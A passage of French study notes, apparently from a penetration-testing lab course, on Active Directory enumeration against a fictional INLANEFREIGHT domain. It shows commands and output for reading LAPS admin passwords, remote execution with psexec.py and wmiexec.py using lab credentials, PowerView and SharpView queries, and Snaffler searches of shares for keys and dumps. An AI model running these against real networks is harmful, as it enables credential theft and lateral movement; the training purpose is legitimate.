OU=Contractor Laptops,OU=Workstations,DC=INLANEF... INLANEFREIGHT\Domain Admins
OU=Contractor Laptops,OU=Workstations,DC=INLANEF... INLANEFREIGHT\LAPS Admins
OU=Staff Workstations,OU=Workstations,DC=INLANEF... INLANEFREIGHT\Domain Admins
OU=Staff Workstations,OU=Workstations,DC=INLANEF... INLANEFREIGHT\LAPS Admins
OU=Executive Workstations,OU=Workstations,DC=INL... INLANEFREIGHT\Domain Admins
OU=Executive Workstations,OU=Workstations,DC=INL... INLANEFREIGHT\LAPS Admins
OU=Mail Servers,OU=Servers,DC=INLANEFREIGHT,DC=L... INLANEFREIGHT\Domain Admins
OU=Mail Servers,OU=Servers,DC=INLANEFREIGHT,DC=L... INLANEFREIGHT\LAPS Admins
```

Cette commande PowerShell est utilisée pour rechercher les entités (principals) qui ont des droits étendus pour lire les attributs de mot de passe de la solution LAPS (Local Administrator Password Solution) dans Active Directory. Utile pour auditer les permissions et s’assurer que seuls les utilisateurs autorisés peuvent accéder aux mots de passe administratifs gérés par LAPS.
```
Find-AdmPwdExtendedRights

ComputerName                Identity                    Reason
------------                --------                    ------
EXCHG01.INLANEFREIGHT.LOCAL INLANEFREIGHT\Domain Admins Delegated
EXCHG01.INLANEFREIGHT.LOCAL INLANEFREIGHT\LAPS Admins   Delegated
SQL01.INLANEFREIGHT.LOCAL   INLANEFREIGHT\Domain Admins Delegated
SQL01.INLANEFREIGHT.LOCAL   INLANEFREIGHT\LAPS Admins   Delegated
WS01.INLANEFREIGHT.LOCAL    INLANEFREIGHT\Domain Admins Delegated
WS01.INLANEFREIGHT.LOCAL    INLANEFREIGHT\LAPS Admins   Delegated
```

Cette commande PowerShell affiche tous les ordinateurs avec LAPS (Local Administrator Password Solution) activé, y compris les informations sur l’expiration des mots de passe et les mots de passe eux-mêmes si l’utilisateur a les droits d’accès nécessaires. Utile pour auditer les environnements Active Directory qui ont déployé LAPS, ce qui peut aider à comprendre quelles machines sont protégées et comment les mots de passe administratifs sont gérés.
```
PS C:\htb> Get-LAPSComputers

ComputerName                Password       Expiration
------------                --------       ----------
DC01.INLANEFREIGHT.LOCAL    6DZ[+A/[]19d$F 08/26/2020 23:29:45
EXCHG01.INLANEFREIGHT.LOCAL oj+2A+[hHMMtj, 09/26/2020 00:51:30
SQL01.INLANEFREIGHT.LOCAL   9G#f;p41dcAe,s 09/26/2020 00:30:09
WS01.INLANEFREIGHT.LOCAL    TCaG-F)3No;l8C 09/26/2020 00:46:04
```


Cette série de commandes rpcclient permet d’effectuer plusieurs actions pour auditer un environnement Active Directory. Voici ce que chaque partie de la commande fait :

enumdomusers : Énumère tous les utilisateurs du domaine. Cela te donne une liste complète des utilisateurs présents dans le domaine.

queryuser 0x492 : Récupère les informations détaillées sur un utilisateur spécifique en utilisant son RID (Relative Identifier). Cela te permet d’obtenir des détails précis sur cet utilisateur particulier.

enumdomgroups : Énumère tous les groupes du domaine. Cela te donne une liste complète des groupes présents dans le domaine.

querygroup 0xff0 : Récupère les informations détaillées sur un groupe spécifique en utilisant son RID. Cela te permet d’obtenir des détails précis sur ce groupe particulier.
```
rpcclient $> enumdomusers
queryuser 0x492
enumdomgroups
querygroup 0xff0
```

Cette commande utilise CrackMapExec pour se connecter à un serveur SMB à l’adresse IP 172.16.5.5 avec les identifiants utilisateur forend et mot de passe Klmcargo2. Elle utilise le module spider_plus pour explorer le partage réseau spécifié (Department Shares). Utile pour découvrir et cartographier les partages réseau disponibles sur un système cible, en recherchant des fichiers et des informations sensibles.
```
sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 -M spider_plus --share 'Department Shares'

```

Cette commande utilise l’outil psexec.py d’Impacket pour se connecter à un hôte Windows à l’adresse IP 172.16.5.125 via le partage administratif ADMIN$ en utilisant les identifiants utilisateur wley et mot de passe transporter@4 dans le domaine inlanefreight.local. Utile pour obtenir un accès à distance avec des privilèges administratifs sur la machine cible.
```
psexec.py inlanefreight.local/wley:'transporter@4'@172.16.5.125
```

Cette commande utilise l’outil wmiexec.py d’Impacket pour se connecter à un hôte Windows à l’adresse IP 172.16.5.5 via WMI (Windows Management Instrumentation) en utilisant les identifiants utilisateur wley et mot de passe transporter@4 dans le domaine inlanefreight.local. Utile pour exécuter des commandes à distance sur la machine cible avec des privilèges administratifs.
```
wmiexec.py inlanefreight.local/wley:'transporter@4'@172.16.5.5
```
```

Get-Module
ModuleType Version    Name                                ExportedCommands
---------- -------    ----                                ----------------
Manifest   3.1.0.0    Microsoft.PowerShell.Utility        {Add-Member, Add-Type, Clear-Variable, Compare-Object...}
Script     2.0.0      PSReadline                          {Get-PSReadLineKeyHandler, Get-PSReadLineOption, Remove-PS...


Import-Module ActiveDirectory
PS C:\htb> Get-Module

ModuleType Version    Name                                ExportedCommands
---------- -------    ----                                ----------------
Manifest   1.0.1.0    ActiveDirectory                     {Add-ADCentralAccessPolicyMember, Add-ADComputerServiceAcc...
Manifest   3.1.0.0    Microsoft.PowerShell.Utility        {Add-Member, Add-Type, Clear-Variable, Compare-Object...}
Script     2.0.0      PSReadline                          {Get-PSReadLineKeyHandler, Get-PSReadLineOption, Remove-PS...

Get-ADDomain

AllowedDNSSuffixes                 : {}
ChildDomains                       : {LOGISTICS.INLANEFREIGHT.LOCAL}
ComputersContainer                 : CN=Computers,DC=INLANEFREIGHT,DC=LOCAL
DeletedObjectsContainer            : CN=Deleted Objects,DC=INLANEFREIGHT,DC=LOCAL
DistinguishedName                  : DC=INLANEFREIGHT,DC=LOCAL
DNSRoot                            : INLANEFREIGHT.LOCAL
DomainControllersContainer         : OU=Domain Controllers,DC=INLANEFREIGHT,DC=LOCAL
DomainMode                         : Windows2016Domain
DomainSID                          : S-1-5-21-3842939050-3880317879-2865463114
ForeignSecurityPrincipalsContainer : CN=ForeignSecurityPrincipals,DC=INLANEFREIGHT,DC=LOCAL
Forest                             : INLANEFREIGHT.LOCAL
InfrastructureMaster               : ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL
LastLogonReplicationInterval       :
LinkedGroupPolicyObjects           : {cn={DDBB8574-E94E-4525-8C9D-ABABE31223D0},cn=policies,cn=system,DC=INLANEFREIGHT,
                                     DC=LOCAL, CN={31B2F340-016D-11D2-945F-00C04FB984F9},CN=Policies,CN=System,DC=INLAN
                                     EFREIGHT,DC=LOCAL}
LostAndFoundContainer              : CN=LostAndFound,DC=INLANEFREIGHT,DC=LOCAL
ManagedBy                          :
Name                               : INLANEFREIGHT
NetBIOSName                        : INLANEFREIGHT
ObjectClass                        : domainDNS
ObjectGUID                         : 71e4ecd1-a9f6-4f55-8a0b-e8c398fb547a
ParentDomain                       :
PDCEmulator                        : ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL
PublicKeyRequiredPasswordRolling   : True
QuotasContainer                    : CN=NTDS Quotas,DC=INLANEFREIGHT,DC=LOCAL
ReadOnlyReplicaDirectoryServers    : {}
ReplicaDirectoryServers            : {ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL}
RIDMaster                          : ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL
SubordinateReferences              : {DC=LOGISTICS,DC=INLANEFREIGHT,DC=LOCAL,
                                     DC=ForestDnsZones,DC=INLANEFREIGHT,DC=LOCAL,
                                     DC=DomainDnsZones,DC=INLANEFREIGHT,DC=LOCAL,
                                     CN=Configuration,DC=INLANEFREIGHT,DC=LOCAL}
SystemsContainer                   : CN=System,DC=INLANEFREIGHT,DC=LOCAL
UsersContainer                     : CN=Users,DC=INLANEFREIGHT,DC=LOCAL
```


Cette commande PowerShell récupère tous les comptes d’utilisateurs dans Active Directory qui ont un attribut ServicePrincipalName non nul. Utile pour identifier les comptes de service, car ces comptes sont souvent utilisés par des applications et des services pour s’authentifier auprès d’autres services.
```
 Get-ADUser -Filter {ServicePrincipalName -ne "$null"} -Properties ServicePrincipalName

DistinguishedName    : CN=adfs,OU=Service Accounts,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL
Enabled              : True
GivenName            : Sharepoint
Name                 : adfs
ObjectClass          : user
ObjectGUID           : 49b53bea-4bc4-4a68-b694-b806d9809e95
SamAccountName       : adfs
ServicePrincipalName : {adfsconnect/azure01.inlanefreight.local}
SID                  : S-1-5-21-3842939050-3880317879-2865463114-5244
Surname              : Admin
UserPrincipalName    :

DistinguishedName    : CN=BACKUPAGENT,OU=Service Accounts,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL
Enabled              : True
GivenName            : Jessica
Name                 : BACKUPAGENT
ObjectClass          : user
ObjectGUID           : 2ec53e98-3a64-4706-be23-1d824ff61bed
SamAccountName       : backupagent
ServicePrincipalName : {backupjob/veam001.inlanefreight.local}
SID                  : S-1-5-21-3842939050-3880317879-2865463114-5220
Surname              : Systemmailbox 8Cc370d3-822A-4Ab8-A926-Bb94bd0641a9
UserPrincipalName    :

<SNIP>
```


Cette commande PowerShell récupère toutes les relations de confiance (trusts) dans Active Directory. Utile pour obtenir une vue d’ensemble des relations de confiance établies entre différents domaines ou forêts, ce qui peut aider à comprendre les connexions et les permissions entre eux.
```
 Get-ADTrust -Filter *

Direction               : BiDirectional
DisallowTransivity      : False
DistinguishedName       : CN=LOGISTICS.INLANEFREIGHT.LOCAL,CN=System,DC=INLANEFREIGHT,DC=LOCAL
ForestTransitive        : False
IntraForest             : True
IsTreeParent            : False
IsTreeRoot              : False
Name                    : LOGISTICS.INLANEFREIGHT.LOCAL
ObjectClass             : trustedDomain
ObjectGUID              : f48a1169-2e58-42c1-ba32-a6ccb10057ec
SelectiveAuthentication : False
SIDFilteringForestAware : False
SIDFilteringQuarantined : False
Source                  : DC=INLANEFREIGHT,DC=LOCAL
Target                  : LOGISTICS.INLANEFREIGHT.LOCAL
TGTDelegation           : False
TrustAttributes         : 32
TrustedPolicy           :
TrustingPolicy          :
TrustType               : Uplevel
UplevelOnly             : False
UsesAESKeys             : False
UsesRC4Encryption       : False

Direction               : BiDirectional
DisallowTransivity      : False
DistinguishedName       : CN=FREIGHTLOGISTICS.LOCAL,CN=System,DC=INLANEFREIGHT,DC=LOCAL
ForestTransitive        : True
IntraForest             : False
IsTreeParent            : False
IsTreeRoot              : False
Name                    : FREIGHTLOGISTICS.LOCAL
ObjectClass             : trustedDomain
ObjectGUID              : 1597717f-89b7-49b8-9cd9-0801d52475ca
SelectiveAuthentication : False
SIDFilteringForestAware : False
SIDFilteringQuarantined : False
Source                  : DC=INLANEFREIGHT,DC=LOCAL
Target                  : FREIGHTLOGISTICS.LOCAL
TGTDelegation           : False
TrustAttributes         : 8
TrustedPolicy           :
TrustingPolicy          :
TrustType               : Uplevel
UplevelOnly             : False
UsesAESKeys             : False
UsesRC4Encryption       : False
```


Cette commande PowerShell récupère tous les groupes dans Active Directory et sélectionne uniquement leurs noms. Utile pour obtenir une liste complète des noms de groupes présents dans un environnement Active Directory, ce qui peut aider à organiser et à gérer les permissions et les accès.
```
 Get-ADGroup -Filter * | select name

name
----
Administrators
Users
Guests
Print Operators
Backup Operators
Replicator
Remote Desktop Users
Network Configuration Operators
Performance Monitor Users
Performance Log Users
Distributed COM Users
IIS_IUSRS
Cryptographic Operators
Event Log Readers
Certificate Service DCOM Access
RDS Remote Access Servers
RDS Endpoint Servers
RDS Management Servers
Hyper-V Administrators
Access Control Assistance Operators
Remote Management Users
Storage Replica Administrators
Domain Computers
Domain Controllers
Schema Admins
Enterprise Admins
Cert Publishers
Domain Admins

<SNIP>
```


Cette commande PowerShell récupère les informations sur le groupe “Backup Operators” dans Active Directory. Utile pour obtenir des détails spécifiques sur ce groupe, comme ses membres, ses attributs et ses permissions, ce qui peut aider à gérer les accès et les rôles de sauvegarde dans un environnement Active Directory.
```
Get-ADGroup -Identity "Backup Operators"

DistinguishedName : CN=Backup Operators,CN=Builtin,DC=INLANEFREIGHT,DC=LOCAL
GroupCategory     : Security
GroupScope        : DomainLocal
Name              : Backup Operators
ObjectClass       : group
ObjectGUID        : 6276d85d-9c39-4b7c-8449-cad37e8abc38
SamAccountName    : Backup Operators
SID               : S-1-5-32-551
```

```
Get-ADGroupMember -Identity "Backup Operators"

distinguishedName : CN=BACKUPAGENT,OU=Service Accounts,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL
name              : BACKUPAGENT
objectClass       : user
objectGUID        : 2ec53e98-3a64-4706-be23-1d824ff61bed
SamAccountName    : backupagent
SID               : S-1-5-21-3842939050-3880317879-2865463114-5220
```

### PowerView

**PowerView** est un outil écrit en PowerShell qui nous aide à obtenir une connaissance situationnelle dans un environnement Active Directory (AD). Tout comme BloodHound, il permet d'identifier où les utilisateurs sont connectés sur un réseau, d'énumérer les informations de domaine telles que les utilisateurs, les ordinateurs, les groupes, les ACL, les relations de confiance, de rechercher des partages de fichiers et des mots de passe, de réaliser des attaques Kerberoasting, et bien plus encore. C'est un outil très polyvalent qui peut nous fournir une grande visibilité sur la posture de sécurité du domaine de notre client. Il nécessite plus de travail manuel pour déterminer les mauvaises configurations et les relations au sein du domaine que BloodHound, mais lorsqu'il est bien utilisé, il peut nous aider à identifier des mauvaises configurations subtiles.

Examinons certaines des capacités de PowerView et voyons quelles données il retourne. Le tableau ci-dessous décrit certaines des fonctions les plus utiles offertes par PowerView.

| Commande | Description |
| --- | --- |
| **Export-PowerViewCSV** | Ajoute les résultats à un fichier CSV |
| **ConvertTo-SID** | Convertit un nom d'utilisateur ou de groupe en sa valeur SID |
| **Get-DomainSPNTicket** | Demande le ticket Kerberos pour un compte Service Principal Name (SPN) spécifié |

#### Fonctions Domain/LDAP :
| Commande | Description |
| --- | --- |
| **Get-Domain** | Retourne l'objet AD pour le domaine actuel (ou spécifié) |
| **Get-DomainController** | Retourne une liste des contrôleurs de domaine pour le domaine spécifié |
| **Get-DomainUser** | Retourne tous les utilisateurs ou des objets utilisateur spécifiques dans AD |
| **Get-DomainComputer** | Retourne tous les ordinateurs ou des objets ordinateur spécifiques dans AD |
| **Get-DomainGroup** | Retourne tous les groupes ou des objets groupe spécifiques dans AD |
| **Get-DomainOU** | Recherche tous les objets OU ou des objets OU spécifiques dans AD |
| **Find-InterestingDomainAcl** | Trouve les ACL d'objets dans le domaine avec des droits de modification définis sur des objets non intégrés |
| **Get-DomainGroupMember** | Retourne les membres d'un groupe de domaine spécifique |
| **Get-DomainFileServer** | Retourne une liste de serveurs fonctionnant probablement comme serveurs de fichiers |
| **Get-DomainDFSShare** | Retourne une liste de tous les systèmes de fichiers distribués pour le domaine actuel (ou spécifié) |

#### Fonctions GPO :
| Commande | Description |
| --- | --- |
| **Get-DomainGPO** | Retourne tous les GPO ou des objets GPO spécifiques dans AD |
| **Get-DomainPolicy** | Retourne la politique de domaine par défaut ou la politique du contrôleur de domaine pour le domaine actuel |

#### Fonctions d'énumération des ordinateurs :
| Commande | Description |
| --- | --- |
| **Get-NetLocalGroup** | Énumère les groupes locaux sur la machine locale ou une machine distante |
| **Get-NetLocalGroupMember** | Énumère les membres d'un groupe local spécifique |
| **Get-NetShare** | Retourne les partages ouverts sur la machine locale (ou une machine distante) |
| **Get-NetSession** | Retourne les informations de session pour la machine locale (ou une machine distante) |
| **Test-AdminAccess** | Teste si l'utilisateur actuel a un accès administratif à la machine locale (ou une machine distante) |

#### Fonctions 'Meta' Threaded :
| Commande | Description |
| --- | --- |
| **Find-DomainUserLocation** | Trouve les machines où des utilisateurs spécifiques sont connectés |
| **Find-DomainShare** | Trouve des partages accessibles sur les machines du domaine |
| **Find-InterestingDomainShareFile** | Recherche des fichiers correspondant à des critères spécifiques sur des partages lisibles dans le domaine |
| **Find-LocalAdminAccess** | Trouve des machines sur le domaine local où l'utilisateur actuel a un accès administrateur local |

#### Fonctions de confiance de domaine :
| Commande | Description |
| --- | --- |
| **Get-DomainTrust** | Retourne les relations de confiance de domaine pour le domaine actuel ou un domaine spécifié |
| **Get-ForestTrust** | Retourne toutes les relations de confiance de forêt pour la forêt actuelle ou une forêt spécifiée |
| **Get-DomainForeignUser** | Énumère les utilisateurs qui sont dans des groupes en dehors du domaine de l'utilisateur |
| **Get-DomainForeignGroupMember** | Énumère les groupes avec des utilisateurs en dehors du domaine du groupe et retourne chaque membre étranger |
| **Get-DomainTrustMapping** | Énumère toutes les relations de confiance pour le domaine actuel et tous les autres domaines vus |


Cette commande PowerShell récupère les informations détaillées sur un utilisateur spécifique dans Active Directory (AD) en utilisant son identité (ici, mmorgan) et le domaine spécifié (inlanefreight.local). Elle sélectionne ensuite des propriétés spécifiques de l’utilisateur pour les afficher. Utile pour obtenir des détails précis sur un utilisateur particulier, ce qui peut aider à gérer les comptes et les permissions dans un environnement AD.
```
Get-DomainUser -Identity mmorgan -Domain inlanefreight.local | Select-Object -Property name,samaccountname,description,memberof,whencreated,pwdlastset,lastlogontimestamp,accountexpires,admincount,userprincipalname,serviceprincipalname,useraccountcontrol

name                 : Matthew Morgan
samaccountname       : mmorgan
description          :
memberof             : {CN=VPN Users,OU=Security Groups,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL, CN=Shared Calendar
                       Read,OU=Security Groups,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL, CN=Printer Access,OU=Security
                       Groups,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL, CN=File Share H Drive,OU=Security
                       Groups,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL...}
whencreated          : 10/27/2021 5:37:06 PM
pwdlastset           : 11/18/2021 10:02:57 AM
lastlogontimestamp   : 2/27/2022 6:34:25 PM
accountexpires       : NEVER
admincount           : 1
userprincipalname    : mmorgan@inlanefreight.local
serviceprincipalname :
mail                 :
useraccountcontrol   : NORMAL_ACCOUNT, DONT_EXPIRE_PASSWORD, DONT_REQ_PREAUTH
```

Cette commande PowerShell utilise PowerView pour récupérer tous les membres du groupe “Domain Admins” dans Active Directory, y compris les membres des groupes imbriqués. Utile pour obtenir une vue complète des utilisateurs et groupes ayant des privilèges administratifs dans le domaine, ce qui peut aider à auditer les permissions et à identifier les risques de sécurité potentiels.
```
Get-DomainGroupMember -Identity "Domain Admins" -Recurse

GroupDomain             : INLANEFREIGHT.LOCAL
GroupName               : Domain Admins
GroupDistinguishedName  : CN=Domain Admins,CN=Users,DC=INLANEFREIGHT,DC=LOCAL
MemberDomain            : INLANEFREIGHT.LOCAL
MemberName              : svc_qualys
MemberDistinguishedName : CN=svc_qualys,OU=Service Accounts,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL
MemberObjectClass       : user
MemberSID               : S-1-5-21-3842939050-3880317879-2865463114-5613

GroupDomain             : INLANEFREIGHT.LOCAL
GroupName               : Domain Admins
GroupDistinguishedName  : CN=Domain Admins,CN=Users,DC=INLANEFREIGHT,DC=LOCAL
MemberDomain            : INLANEFREIGHT.LOCAL
MemberName              : sp-admin
MemberDistinguishedName : CN=Sharepoint Admin,OU=Service Accounts,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL
MemberObjectClass       : user
MemberSID               : S-1-5-21-3842939050-3880317879-2865463114-5228

GroupDomain             : INLANEFREIGHT.LOCAL
GroupName               : Secadmins
GroupDistinguishedName  : CN=Secadmins,OU=Security Groups,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL
MemberDomain            : INLANEFREIGHT.LOCAL
MemberName              : spong1990
MemberDistinguishedName : CN=Maggie
                          Jablonski,OU=Operations,OU=Logistics-HK,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL
MemberObjectClass       : user
MemberSID               : S-1-5-21-3842939050-3880317879-2865463114-1965

<SNIP>
```

Cette commande PowerShell utilise PowerView pour mapper toutes les relations de confiance de domaine accessibles. Utile pour obtenir une vue d’ensemble des relations de confiance établies entre différents domaines ou forêts, ce qui peut aider à comprendre les connexions et les permissions entre eux.
```
Get-DomainTrustMapping

SourceName      : INLANEFREIGHT.LOCAL
TargetName      : LOGISTICS.INLANEFREIGHT.LOCAL
TrustType       : WINDOWS_ACTIVE_DIRECTORY
TrustAttributes : WITHIN_FOREST
TrustDirection  : Bidirectional
WhenCreated     : 11/1/2021 6:20:22 PM
WhenChanged     : 2/26/2022 11:55:55 PM

SourceName      : INLANEFREIGHT.LOCAL
TargetName      : FREIGHTLOGISTICS.LOCAL
TrustType       : WINDOWS_ACTIVE_DIRECTORY
TrustAttributes : FOREST_TRANSITIVE
TrustDirection  : Bidirectional
WhenCreated     : 11/1/2021 8:07:09 PM
WhenChanged     : 2/27/2022 12:02:39 AM

SourceName      : LOGISTICS.INLANEFREIGHT.LOCAL
TargetName      : INLANEFREIGHT.LOCAL
TrustType       : WINDOWS_ACTIVE_DIRECTORY
TrustAttributes : WITHIN_FOREST
TrustDirection  : Bidirectional
WhenCreated     : 11/1/2021 6:20:22 PM
WhenChanged     : 2/26/2022 11:55:55 PM
```

Cette commande PowerShell teste si l’utilisateur actuel a un accès administratif à l’ordinateur spécifié (ici, ACADEMY-EA-MS01). Utile pour vérifier les permissions administratives sur des machines locales ou distantes, ce qui peut aider à auditer les accès et les privilèges dans un environnement Active Directory.
```
Test-AdminAccess -ComputerName ACADEMY-EA-MS01

ComputerName    IsAdmin
------------    -------
ACADEMY-EA-MS01    True
```

Cette commande PowerShell utilise PowerView pour récupérer tous les utilisateurs dans Active Directory (AD) qui ont un Service Principal Name (SPN) défini. Utile pour identifier les comptes de service, car ces comptes sont souvent utilisés par des applications et des services pour s’authentifier auprès d’autres services.
```
Get-DomainUser -SPN -Properties samaccountname,ServicePrincipalName

serviceprincipalname                          samaccountname
--------------------                          --------------
adfsconnect/azure01.inlanefreight.local       adfs
backupjob/veam001.inlanefreight.local         backupagent
d0wngrade/kerberoast.inlanefreight.local      d0wngrade
kadmin/changepw                               krbtgt
MSSQLSvc/DEV-PRE-SQL.inlanefreight.local:1433 sqldev
MSSQLSvc/SPSJDB.inlanefreight.local:1433      sqlprod
MSSQLSvc/SQL-CL01-01inlanefreight.local:49351 sqlqa
sts/inlanefreight.local                       solarwindsmonitor
testspn/kerberoast.inlanefreight.local        testspn
testspn2/kerberoast.inlanefreight.local       testspn2
```

La commande Get-DomainUser de SharpView permet de récupérer des informations sur les utilisateurs dans Active Directory (AD). Elle offre de nombreux paramètres pour affiner la recherche et obtenir des détails spécifiques sur les utilisateurs.
```
 .\SharpView.exe Get-DomainUser -Help

Get_DomainUser -Identity <String[]> -DistinguishedName <String[]> -SamAccountName <String[]> -Name <String[]> -MemberDistinguishedName <String[]> -MemberName <String[]> -SPN <Boolean> -AdminCount <Boolean> -AllowDelegation <Boolean> -DisallowDelegation <Boolean> -TrustedToAuth <Boolean> -PreauthNotRequired <Boolean> -KerberosPreauthNotRequired <Boolean> -NoPreauth <Boolean> -Domain <String> -LDAPFilter <String> -Filter <String> -Properties <String[]> -SearchBase <String> -ADSPath <String> -Server <String> -DomainController <String> -SearchScope <SearchScope> -ResultPageSize <Int32> -ServerTimeLimit <Nullable`1> -SecurityMasks <Nullable`1> -Tombstone <Boolean> -FindOne <Boolean> -ReturnOne <Boolean> -Credential <NetworkCredential> -Raw <Boolean> -UACFilter <UACEnum>
```

Cette commande SharpView récupère les informations sur un utilisateur spécifique dans Active Directory (AD) en utilisant son identité (ici, forend). Utile pour obtenir des détails précis sur cet utilisateur particulier, ce qui peut aider à gérer les comptes et les permissions dans un environnement AD.
```
PS C:\htb> .\SharpView.exe Get-DomainUser -Identity forend

[Get-DomainSearcher] search base: LDAP://ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL/DC=INLANEFREIGHT,DC=LOCAL
[Get-DomainUser] filter string: (&(samAccountType=805306368)(|(samAccountName=forend)))
objectsid                      : {S-1-5-21-3842939050-3880317879-2865463114-5614}
samaccounttype                 : USER_OBJECT
objectguid                     : 53264142-082a-4cb8-8714-8158b4974f3b
useraccountcontrol             : NORMAL_ACCOUNT
accountexpires                 : 12/31/1600 4:00:00 PM
lastlogon                      : 4/18/2022 1:01:21 PM
lastlogontimestamp             : 4/9/2022 1:33:21 PM
pwdlastset                     : 2/28/2022 12:03:45 PM
lastlogoff                     : 12/31/1600 4:00:00 PM
badPasswordTime                : 4/5/2022 7:09:07 AM
name                           : forend
distinguishedname              : CN=forend,OU=IT Admins,OU=IT,OU=HQ-NYC,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL
whencreated                    : 2/28/2022 8:03:45 PM
whenchanged                    : 4/9/2022 8:33:21 PM
samaccountname                 : forend
memberof                       : {CN=VPN Users,OU=Security Groups,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL, CN=Shared Calendar Read,OU=Security Groups,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL, CN=Printer Access,OU=Security Groups,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL, CN=File Share H Drive,OU=Security Groups,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL, CN=File Share G Drive,OU=Security Groups,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL}
cn                             : {forend}
objectclass                    : {top, person, organizationalPerson, user}
badpwdcount                    : 0
countrycode                    : 0
usnchanged                     : 3259288
logoncount                     : 26618
primarygroupid                 : 513
objectcategory                 : CN=Person,CN=Schema,CN=Configuration,DC=INLANEFREIGHT,DC=LOCAL
dscorepropagationdata          : {3/24/2022 3:58:07 PM, 3/24/2022 3:57:44 PM, 3/24/2022 3:52:58 PM, 3/24/2022 3:49:31 PM, 7/14/1601 10:36:49 PM}
usncreated                     : 3054181
instancetype                   : 4
codepage                       : 0
```

Cette commande utilise Snaffler pour scanner un domaine Active Directory (ici, inlanefreight.local) à la recherche de données sensibles et les enregistre dans un fichier de log (snaffler.log). Le paramètre -v data spécifie que la commande doit être exécutée en mode verbeux pour les données.
```
Snaffler.exe -s -d inlanefreight.local -o snaffler.log -v data
```

```

PS C:\htb> .\Snaffler.exe  -d INLANEFREIGHT.LOCAL -s -v data

 .::::::.:::.    :::.  :::.    .-:::::'.-:::::':::    .,:::::: :::::::..
;;;`    ``;;;;,  `;;;  ;;`;;   ;;;'''' ;;;'''' ;;;    ;;;;'''' ;;;;``;;;;
'[==/[[[[, [[[[[. '[[ ,[[ '[[, [[[,,== [[[,,== [[[     [[cccc   [[[,/[[['
  '''    $ $$$ 'Y$c$$c$$$cc$$$c`$$$'`` `$$$'`` $$'     $$""   $$$$$$c
 88b    dP 888    Y88 888   888,888     888   o88oo,.__888oo,__ 888b '88bo,
  'YMmMY'  MMM     YM YMM   ''` 'MM,    'MM,  ''''YUMMM''''YUMMMMMMM   'W'
                         by l0ss and Sh3r4 - github.com/SnaffCon/Snaffler

2022-03-31 12:16:54 -07:00 [Share] {Black}(\\ACADEMY-EA-MS01.INLANEFREIGHT.LOCAL\ADMIN$)
2022-03-31 12:16:54 -07:00 [Share] {Black}(\\ACADEMY-EA-MS01.INLANEFREIGHT.LOCAL\C$)
2022-03-31 12:16:54 -07:00 [Share] {Green}(\\ACADEMY-EA-MX01.INLANEFREIGHT.LOCAL\address)
2022-03-31 12:16:54 -07:00 [Share] {Green}(\\ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL\Department Shares)
2022-03-31 12:16:54 -07:00 [Share] {Green}(\\ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL\User Shares)
2022-03-31 12:16:54 -07:00 [Share] {Green}(\\ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL\ZZZ_archive)
2022-03-31 12:17:18 -07:00 [Share] {Green}(\\ACADEMY-EA-CA01.INLANEFREIGHT.LOCAL\CertEnroll)
2022-03-31 12:17:19 -07:00 [File] {Black}<KeepExtExactBlack|R|^\.kdb$|289B|3/31/2022 12:09:22 PM>(\\ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL\Department Shares\IT\Infosec\GroupBackup.kdb) .kdb
2022-03-31 12:17:19 -07:00 [File] {Red}<KeepExtExactRed|R|^\.key$|299B|3/31/2022 12:05:33 PM>(\\ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL\Department Shares\IT\Infosec\ShowReset.key) .key
2022-03-31 12:17:19 -07:00 [Share] {Green}(\\ACADEMY-EA-FILE.INLANEFREIGHT.LOCAL\UpdateServicesPackages)
2022-03-31 12:17:19 -07:00 [File] {Black}<KeepExtExactBlack|R|^\.kwallet$|302B|3/31/2022 12:04:45 PM>(\\ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL\Department Shares\IT\Infosec\WriteUse.kwallet) .kwallet
2022-03-31 12:17:19 -07:00 [File] {Red}<KeepExtExactRed|R|^\.key$|298B|3/31/2022 12:05:10 PM>(\\ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL\Department Shares\IT\Infosec\ProtectStep.key) .key
2022-03-31 12:17:19 -07:00 [File] {Black}<KeepExtExactBlack|R|^\.ppk$|275B|3/31/2022 12:04:40 PM>(\\ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL\Department Shares\IT\Infosec\StopTrace.ppk) .ppk
2022-03-31 12:17:19 -07:00 [File] {Red}<KeepExtExactRed|R|^\.key$|301B|3/31/2022 12:09:17 PM>(\\ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL\Department Shares\IT\Infosec\WaitClear.key) .key
2022-03-31 12:17:19 -07:00 [File] {Red}<KeepExtExactRed|R|^\.sqldump$|312B|3/31/2022 12:05:30 PM>(\\ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL\Department Shares\IT\Development\DenyRedo.sqldump) .sqldump
2022-03-31 12:17:19 -07:00 [File] {Red}<KeepExtExactRed|R|^\.sqldump$|310B|3/31/2022 12:05:02 PM>(\\ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL\Department Shares\IT\Development\AddPublish.sqldump) .sqldump
2022-03-31 12:17:19 -07:00 [Share] {Green}(\\ACADEMY-EA-FILE.INLANEFREIGHT.LOCAL\WsusContent)
